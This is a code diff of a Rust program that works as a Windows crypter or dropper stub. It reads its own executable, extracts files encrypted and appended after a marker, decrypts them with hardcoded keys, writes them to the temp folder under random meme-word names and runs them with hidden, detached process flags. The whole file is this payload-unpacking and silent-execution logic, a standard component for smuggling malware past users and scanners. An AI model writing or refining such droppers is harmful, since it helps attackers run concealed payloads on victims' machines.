@@ -1,58 +1,175 @@
-#![windows_subsystem = "windows"]
+use anyhow::Result;
+use std::{cell::RefCell, fs, os::windows::process::CommandExt};
+use endec::{constatants::{IV, KEY, SYMBOL_ARRAY}, decrypt::Decrypter, EncryptType};
+use rand::Rng as _;
 
-mod crypter;
-use std::io::Read;
-use std::os::windows::process::CommandExt;
-use std::fs;
+struct EncryptedFile {
+    extension: String,
+    encrypted_content: Vec<u8>,
+}
 
-fn main() {
-    // read self bytes,
-    // then find seperator
-    let key: [u8; 32] = [239, 39, 152, 9, 150, 12, 250, 189, 213, 50, 40, 58, 108, 102, 200, 138, 222, 213, 47, 3, 107, 4, 47, 80, 169, 41, 212, 121, 139, 175, 214, 29];
-    let iv: [u8; 16] = [136, 165, 117, 219, 181, 24, 7, 110, 151, 155, 142, 28, 142, 88, 64, 9];
+fn parse_stub(binary: &[u8]) -> Option<Vec<u8>> {
+    let symbol_array_index = binary.windows(SYMBOL_ARRAY.len())
+        .rposition(|window| window == SYMBOL_ARRAY);
 
-    let selfile = match fs::read(std::env::current_exe().unwrap_or("".into())) {
-        Ok(file) => {
-            file
-        }
-        Err(e) => {
-            return
-        }
-    };
-
-    // find seperator
-    let mut str = String::from_utf8_lossy(selfile.as_slice());
-    let mut name_extension = Vec::new();
-    let mut files= Vec::new();
-
-    // fix seperator
-    let fix_seperator = &base64::encode(crypter::encrypt("♠●☆♠♠●☆♠●☆●♠♠●☆♠●☆●☆☆".as_bytes(), &key, &iv).unwrap());
-
-    let mut sep_splits = str.split(fix_seperator);
-    let key_hint = crypter::decrypt(&base64::decode(sep_splits.clone().nth(1).unwrap()).unwrap(), &key, &iv).unwrap();
-    let sep_hint = crypter::decrypt(&base64::decode(sep_splits.clone().nth(2).unwrap()).unwrap(), &key, &iv).unwrap();
-
-    let real_sep = &base64::encode(crypter::encrypt(sep_hint.as_slice(), &key_hint, &iv).unwrap());
-
-    let splits = &str.split(real_sep);
-    for i in 1..splits.clone().count() {
-        let splits = splits.clone().collect::<Vec<&str>>();
-
-        let bytes = crypter::decrypt(&base64::decode(splits[i]).unwrap(), &key_hint, &iv).unwrap();
-        if i % 2 == 1 {
-            name_extension.push(String::from_utf8(bytes.clone()).unwrap());
-        } else {
-            files.push(bytes.clone());
-        }
+    if let Some(index) = symbol_array_index {
+        let data = &binary[index + SYMBOL_ARRAY.len()..];
+        return Some(data.to_vec());
     }
 
-    for i in 0..files.len() {
-        let f = &files[i];
-        std::fs::write(std::env::temp_dir().join(format!("{}{}.{}", std::env::current_exe().unwrap().file_name().unwrap().to_string_lossy(), i, name_extension[i])), f);
-        std::process::Command::new("cmd")
-            .creation_flags(0x08000000)
-            .arg("/c")// hide flags
-            .raw_arg(format!("\"{}\"", std::env::temp_dir().join(format!("{}{}.{}", std::env::current_exe().unwrap().file_name().unwrap().to_string_lossy(), i, name_extension[i])).to_string_lossy()))
-            .spawn();
+    None
+}
+
+struct BinaryReader {
+    binary: Vec<u8>,
+    pointer: RefCell<usize>,
+}
+
+impl BinaryReader {
+    fn new(binary: Vec<u8>) -> Self {
+        Self { binary, pointer: RefCell::new(0) }
     }
+
+    fn read(&self, size: usize) -> Result<&[u8]> {
+        let pointer = *self.pointer.borrow();
+        if pointer + size > self.binary.len() {
+            return Err(anyhow::anyhow!("EOF"));
+        }
+
+        let value = &self.binary[pointer..pointer + size];
+        *self.pointer.borrow_mut() += size;
+        Ok(value)
+    }
+
+    fn get_encrypted_files(&self) -> Result<Vec<EncryptedFile>> {
+        let mut encrypted_files = Vec::new();
+
+        while let Ok(extension_len) = self.read(1) {
+            // Read extension
+            let extension_len = u8::from_le_bytes(extension_len.try_into()?);
+            let extension = match self.read(extension_len as usize) {
+                Ok(extension) => String::from_utf8(extension.to_vec())?,
+                Err(_) => break,
+            };
+
+            // Read encrypted content
+            let encrypted_len = u64::from_le_bytes(self.read(8)?.try_into()?);
+            let encrypted_content = match self.read(encrypted_len as usize) {
+                Ok(encrypted_content) => encrypted_content.to_vec(),
+                Err(_) => break,
+            };
+
+            encrypted_files.push(EncryptedFile {
+                extension,
+                encrypted_content,
+            });
+        }
+
+        Ok(encrypted_files)
+    }
+}
+
+fn main() -> Result<()> {
+    let self_path = std::env::current_exe()?;
+    let self_binary = fs::read(self_path)?;
+    
+    let mut stub_data = parse_stub(&self_binary).ok_or(anyhow::anyhow!("Failed to parse stub"))?;
+
+    let encrypt_type = EncryptType::from(stub_data[0]);
+
+    // Remove encryption type from encrypted data
+    stub_data.remove(0);
+
+    let reader = BinaryReader::new(stub_data);
+    let encrypted_files = reader.get_encrypted_files()?;
+
+    let decrypter = Decrypter::new(encrypt_type, KEY, IV);
+    for file in encrypted_files {
+        // Add file to temp directory
+        let temp_path = std::env::temp_dir().join(format!("{}.{}", funny_word_generator(3), file.extension));
+        fs::write(temp_path.clone(), decrypter.decrypt_data(file.encrypted_content)?.to_vec())?;
+
+        let _ = std::process::Command::new(temp_path)
+            .creation_flags(0x08000000 | 0x00000200) // CREATE_NO_WINDOW and DETACH_PROCESS
+            .spawn()?;
+    }
+
+    Ok(())
+}
+
+fn funny_word_generator(length: usize) -> String {
+    let words = [
+        "yeet",
+        "bonk",
+        "chonk",
+        "smol", 
+        "chungus",
+        "poggers",
+        "yolo",
+        "doge",
+        "stonks",
+        "boop",
+        "derp",
+        "yikes",
+        "oof",
+        "uwu",
+        "lmao",
+        "bruh",
+        "noice",
+        "sheesh",
+        "slay",
+        "based",
+        "bussin",
+        "cap",
+        "fire",
+        "lit",
+        "mood",
+        "vibe", 
+        "sus",
+        "tea",
+        "salty",
+        "toxic",
+        "tilted",
+        "rage",
+        "pog",
+        "pepega",
+        "kek",
+        "monkas",
+        "pepe",
+        "sadge",
+        "copium",
+        "hopium",
+        "mald",
+        "ratio",
+        "cringe",
+        "woke",
+        "shook",
+        "periodt",
+        "wig",
+        "snapped", 
+        "flex",
+        "bet",
+        "fam",
+        "goat",
+        "hitsdifferent",
+        "lowkey",
+        "highkey",
+        "slaps",
+        "frfr",
+        "deadass",
+        "period",
+        "sis",
+        "chief",
+        "finna",
+        "vibecheck",
+        "facts",
+        "nocap",
+        "rip",
+        "feelsbad"
+    ];
+
+    (0..length)
+        .map(|_| words[rand::thread_rng().gen_range(0..words.len())].to_string())
+        .collect::<Vec<String>>()
+        .join("")
 }
